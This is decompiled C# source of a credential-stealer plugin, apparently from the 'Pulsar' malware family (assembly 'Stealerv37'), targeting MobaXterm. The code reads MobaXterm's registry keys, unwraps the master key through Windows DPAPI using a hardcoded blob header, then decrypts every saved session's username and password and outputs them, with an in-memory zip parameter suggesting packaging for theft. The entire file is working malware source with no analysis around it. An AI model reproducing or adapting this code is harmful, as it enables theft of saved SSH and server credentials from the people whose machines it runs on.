// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.MobaXterm
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;

#nullable disable
namespace Intelix.Targets.Applications;

public class MobaXterm : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string Entropy = (string) Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm").GetValue("SessionP");
    RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm\\m");
    byte[] key = this.DecryptMobaXtermMasterKey((string) registryKey1.GetValue(registryKey1.GetValueNames()[0]), Entropy);
    RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm\\C");
    foreach (string valueName in registryKey2.GetValueNames())
    {
      string[] strArray = ((string) registryKey2.GetValue(valueName)).Split(new char[1]
      {
        ':'
      }, 2);
      string str1 = strArray[0];
      string ciphertextBase64 = strArray[1];
      string str2 = this.DecryptCredential(key, ciphertextBase64);
      Console.WriteLine("[*] Name:     " + valueName);
      Console.WriteLine("[*] Username: " + str1);
      Console.WriteLine("[*] Password: " + str2);
      Console.WriteLine();
    }
  }

  private byte[] DecryptMobaXtermMasterKey(string base64Value, string Entropy)
  {
    byte[] src1 = new byte[20]
    {
      (byte) 1,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 208 /*0xD0*/,
      (byte) 140,
      (byte) 157,
      (byte) 223,
      (byte) 1,
      (byte) 21,
      (byte) 209,
      (byte) 17,
      (byte) 140,
      (byte) 122,
      (byte) 0,
      (byte) 192 /*0xC0*/,
      (byte) 79,
      (byte) 194,
      (byte) 151,
      (byte) 235
    };
    byte[] src2 = Convert.FromBase64String(base64Value);
    byte[] numArray = new byte[src1.Length + src2.Length];
    Buffer.BlockCopy((Array) src1, 0, (Array) numArray, 0, src1.Length);
    Buffer.BlockCopy((Array) src2, 0, (Array) numArray, src1.Length, src2.Length);
    byte[] bytes = Encoding.UTF8.GetBytes(Entropy);
    return ProtectedData.Unprotect(numArray, bytes, DataProtectionScope.CurrentUser);
  }

  private string DecryptCredential(byte[] key, string ciphertextBase64)
  {
    byte[] numArray1 = this.LenientBase64Decode(ciphertextBase64);
    byte[] inputBuffer = new byte[16 /*0x10*/];
    byte[] outputBuffer1 = new byte[16 /*0x10*/];
    using (Aes aes = Aes.Create())
    {
      aes.Mode = CipherMode.ECB;
      aes.Padding = PaddingMode.None;
      aes.Key = key;
      using (ICryptoTransform encryptor = aes.CreateEncryptor())
        encryptor.TransformBlock(inputBuffer, 0, 16 /*0x10*/, outputBuffer1, 0);
    }
    byte[] numArray2 = (byte[]) outputBuffer1.Clone();
    byte[] bytes = new byte[numArray1.Length];
    using (Aes aes = Aes.Create())
    {
      aes.Mode = CipherMode.ECB;
      aes.Padding = PaddingMode.None;
      aes.Key = key;
      using (ICryptoTransform encryptor = aes.CreateEncryptor())
      {
        byte[] outputBuffer2 = new byte[16 /*0x10*/];
        for (int index = 0; index < numArray1.Length; ++index)
        {
          encryptor.TransformBlock(numArray2, 0, 16 /*0x10*/, outputBuffer2, 0);
          bytes[index] = (byte) ((uint) numArray1[index] ^ (uint) outputBuffer2[0]);
          Buffer.BlockCopy((Array) numArray2, 1, (Array) numArray2, 0, 15);
          numArray2[15] = numArray1[index];
        }
      }
    }
    return Encoding.Default.GetString(bytes).TrimEnd(new char[1]);
  }

  private byte[] LenientBase64Decode(string s)
  {
    StringBuilder stringBuilder = new StringBuilder(s.Length);
    foreach (char ch in s)
    {
      switch (ch)
      {
        case '-':
        case '_':
          stringBuilder.Append(ch == '-' ? '+' : '/');
          break;
        case 'A':
        case 'B':
        case 'C':
        case 'D':
        case 'E':
        case 'F':
        case 'G':
        case 'H':
        case 'I':
        case 'J':
        case 'K':
        case 'L':
        case 'M':
        case 'N':
        case 'O':
        case 'P':
        case 'Q':
        case 'R':
        case 'S':
        case 'T':
        case 'U':
        case 'V':
        case 'W':
        case 'X':
        case 'Y':
        case 'Z':
          stringBuilder.Append(ch);
          break;
        default:
          if (ch >= 'a' && ch <= 'z' || ch >= '0' && ch <= '9' || ch == '+' || ch == '/' || ch == '=')
            goto case 'A';
          break;
      }
    }
    string str = stringBuilder.ToString();
    int num1 = str.Length % 4;
    if (num1 != 0)
      str += new string('=', 4 - num1);
    List<byte> byteList = new List<byte>(str.Length * 3 / 4);
    for (int index1 = 0; index1 < str.Length; index1 += 4)
    {
      int[] numArray = new int[4];
      for (int index2 = 0; index2 < 4; ++index2)
      {
        char ch = str[index1 + index2];
        numArray[index2] = ch != '=' ? "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".IndexOf(ch) : -1;
      }
      int num2 = numArray[0];
      int num3 = numArray[1];
      int num4 = numArray[2];
      int num5 = numArray[3];
      byte num6 = (byte) (num2 << 2 | (num3 & 48 /*0x30*/) >> 4);
      byteList.Add(num6);
      if (num4 != -1)
      {
        byte num7 = (byte) ((num3 & 15) << 4 | (num4 & 60) >> 2);
        byteList.Add(num7);
      }
      if (num5 != -1)
      {
        byte num8 = (byte) ((num4 & 3) << 6 | num5);
        byteList.Add(num8);
      }
    }
    return byteList.ToArray();
  }
}
